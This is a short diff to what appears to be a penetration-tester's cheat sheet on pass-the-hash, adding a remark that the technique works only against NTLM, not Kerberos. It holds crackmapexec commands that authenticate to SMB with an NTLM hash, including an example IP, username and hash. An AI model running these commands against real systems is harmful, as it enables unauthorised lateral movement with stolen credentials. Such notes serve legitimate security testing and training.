@@ -1,4 +1,7 @@
 https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash
+Note that this will
+not work for Kerberos authentication but only for servers or services using NTLM authentication
+
 
 crackmapexec smb <IP> -u <User> -H <NTLM>
 crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
